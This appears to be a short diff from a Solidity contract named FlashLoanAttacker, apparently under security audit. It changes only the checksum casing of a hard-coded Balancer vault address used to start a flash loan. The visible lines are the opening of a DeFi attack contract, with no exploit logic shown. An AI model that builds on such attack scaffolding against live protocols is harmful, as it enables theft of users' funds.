@@ -25,7 +25,7 @@ contract FlashLoanAttacker {
     // @audit-info - executes arbitrary callData against borrowed capital
     function executeAttack(AttackParams calldata params) external {
         // 1. Flash borrow
-        IFlashLoanLender lender = IFlashLoanLender(0xBA12222222228d8Ba445958a90aD4EeFC7D8cE2A); // Balancer vault
+        IFlashLoanLender lender = IFlashLoanLender(0xBa12222222228d8ba445958a90aD4eEfc7d8Ce2A); // Balancer vault
         address[] memory tokens = new address[](1);
         tokens[0] = params.borrowToken;
         uint256[] memory amounts = new uint256[](1);
